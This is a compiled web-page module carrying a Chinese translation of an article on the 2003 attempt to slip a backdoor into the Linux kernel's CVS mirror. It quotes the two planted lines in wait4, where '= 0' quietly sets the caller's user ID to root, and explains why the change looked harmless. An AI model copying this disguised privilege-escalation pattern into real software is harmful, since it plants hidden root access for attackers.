import{_ as p,a0 as l,w as s,s as u,I as n,x as e,a1 as r,A as i,ao as d}from"./chunks/framework.C16IyNjs.js";import"./chunks/theme.CClUzVyq.js";const k=JSON.parse('{"title":"揭秘！：2003年Linux後門事件 | LCTT x X-CMD","titleTemplate":false,"description":"揭秘！：2003年Linux後門事件 | LCTT (201310) | X-CMD","frontmatter":{"pageClass":"x-lctt","head":[["meta",{"name":"og:title","content":"揭秘！：2003年Linux後門事件 | LCTT x X-CMD"}],["meta",{"name":"og:description","content":"揭秘！：2003年Linux後門事件 | LCTT (201310) | X-CMD"}]]},"headers":[],"params":{"isLCTT":true,"post":"201310/The Linux Backdoor Attempt of 2003","title":"揭秘！：2003年Linux後門事件","tag":"201310","desc":""},"relativePath":"201310/The Linux Backdoor Attempt of 2003.md","filePath":"[post].md"}'),a={name:"201310/The Linux Backdoor Attempt of 2003.md"};function f(x,t,m,L,T,C){const o=l("Link");return s(),u("div",null,[t[20]||(t[20]=n("h1",{id:"揭秘-2003年linux後門事件",tabindex:"-1"},[e("揭秘！：2003年Linux後門事件 "),n("a",{class:"header-anchor",href:"#揭秘-2003年linux後門事件","aria-label":"Permalink to “揭秘！：2003年Linux後門事件”"},"​")],-1)),n("p",null,[t[1]||(t[1]=e("最近Josh寫了",-1)),r(o,{href:"https://freedom-to-tinker.com/blog/kroll/software-transparency-debian-openssl-bug/"},{default:i(()=>[...t[0]||(t[0]=[e("一篇文章",-1)])]),_:1}),t[2]||(t[2]=e("，講述2006年Debian Linux中出現的一系列安全bug，探討了這些所謂bug是否是NSA植入的後門。（最後他作出結論：可能不是）",-1))]),n("p",null,[t[4]||(t[4]=e("今天我想講述的是另外一個",-1)),r(o,{href:"https://lwn.net/Articles/57135/"},{default:i(()=>[...t[3]||(t[3]=[e("事件",-1)])]),_:1}),t[5]||(t[5]=e("——2003年某些人試圖在Linux內核中植入後門的故事。這次事件很明確，的確有人想植入後門，只是我們不知道此人是誰，而且，也許永遠都不會知道了。",-1))]),t[21]||(t[21]=n("p",null,"時間回到2003年，當時Linux使用一套叫做BitKeeper的系統來存儲Linux源代碼的主拷貝。如果開發者想要提交一份針對源碼的修改，就必須經過一套嚴格的審核過程，以決定這份修改是否能夠合併進主拷貝。每個針對主拷貝的修改都必須附帶一段説明，説明當中都包括了一個記錄相應審核過程的鏈接。",-1)),t[22]||(t[22]=n("p",null,"但是有些人不喜歡BitKeeper，於是這些開發者們就用另一套叫做CVS的系統（譯註：Linus一直拒絕使用CVS，後來不得已使用了BitKeeper，並在因某些原因BitKeeper不再讓開源社區免費使用後，花了不到一個月的時間自己開發了GIT的原型，並且投入了使用），維護了一份Linux源代碼的拷貝，這樣他們就能隨時按自己喜歡的方式獲取Linux源代碼了。CVS中的代碼其實就是直接克隆了BitKeeper中的代碼。",-1)),n("p",null,[t[7]||(t[7]=e("但是在2003年11月5日的時候，Larry McVoy",-1)),r(o,{href:"https://lwn.net/Articles/57137/"},{default:i(()=>[...t[6]||(t[6]=[e("發現",-1)])]),_:1}),t[8]||(t[8]=e("，CVS中的代碼拷貝有一處改動並沒有包含記錄審核的鏈接。調查顯示，這一處改動由陌生人添加，而且從未經過審核，不僅如此，在BitKeeper倉庫的主拷貝中，這一處改動竟然壓根就不存在。經過進一步調查後，可以明確，顯然有人入侵了CVS的服務器並植入了此處改動。",-1))]),t[23]||(t[23]=d(`<p>神秘人物究竟做了哪些改動？這才是真正有趣的地方。改動修改的是Linux中一個叫wait4的函數，程序可以使用該函數進行掛起操作，以等待某些事件的觸發。神秘人物添加的，就是下面這兩行代碼：</p><pre><code>if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-&gt;uid = 0))
    retval = -EINVAL;
</code></pre><p>[有C語言編程經驗的人也許會問：這兩行代碼有什麼特別的？請接着往下看]</p><p>猛地一看，好像這兩行代碼就是一段正常的錯誤校驗代碼，當wait4函數被某種文檔中禁止的方式調用時，wait4就返回一個錯誤代碼。但是一個真正認真的程序猿立刻就會發現代碼中的問題，注意看在第一行末尾，“<strong>= 0</strong>”應該是“<strong>== 0</strong>”才對。是的，“== 0”在這裏才是判斷當前運行代碼的用户ID(current-&gt;uid)是否等於0，而“= 0”不但無法判斷，反而修改了用户ID的值，即，<strong>將其值賦值為0</strong>。</p><p>將用户ID設置為0，這是一個很嚴重的問題，因為ID為0的用户正是“root”，而root賬户可以在系統中做任何事情，包括訪問所有數據、修改任意代碼的行為，能夠危及到整個系統各個部分的安全。因此，這段代碼的影響就是通過特殊手段使得任何調用wait4函數的軟件都擁有了root權限。換句話説，這就是一個典型的後門。</p><p>客觀地説，這一招很漂亮。看起來就像是無關緊要的錯誤校驗，但真實身份卻是一個後門。而且它混在其他經過審核的代碼中間，幾乎規避了所有審核可能會注意到自己的可能性。</p><p>但是它終究還是失敗了，因為Linux小組有足夠強的責任心，注意到了CVS倉庫中的這段代碼沒有經過常規審核。Linux還是略勝一籌。</p><p>這是NSA乾的嗎？只能説有可能。因為有太多擁有技術能力和動機的人有可能實施了此次攻擊。那麼，到底是誰呢？除非某些人主動承認，又或者發現新的確鑿證據，否則，我們將永遠不會知道。</p><hr>`,9)),n("p",null,[t[10]||(t[10]=e("via: ",-1)),r(o,{href:"https://freedom-to-tinker.com/blog/felten/the-linux-backdoor-attempt-of-2003/"},{default:i(()=>[...t[9]||(t[9]=[e("https://freedom-to-tinker.com/blog/felten/the-linux-backdoor-attempt-of-2003/",-1)])]),_:1})]),n("p",null,[t[13]||(t[13]=e("本文由 ",-1)),r(o,{href:"https://github.com/LCTT/TranslateProject"},{default:i(()=>[...t[11]||(t[11]=[e("LCTT",-1)])]),_:1}),t[14]||(t[14]=e(" 原創翻譯，",-1)),r(o,{href:"http://linux.cn/"},{default:i(()=>[...t[12]||(t[12]=[e("Linux中國",-1)])]),_:1}),t[15]||(t[15]=e(" 榮譽推出",-1))]),n("p",null,[t[18]||(t[18]=e("譯者：",-1)),r(o,{href:"https://github.com/tinyeyeser"},{default:i(()=>[...t[16]||(t[16]=[e("tinyeyeser",-1)])]),_:1}),t[19]||(t[19]=e(" 校對：",-1)),r(o,{href:"https://github.com/wxy"},{default:i(()=>[...t[17]||(t[17]=[e("wxy",-1)])]),_:1})])])}const A=p(a,[["render",f]]);export{k as __pageData,A as default};
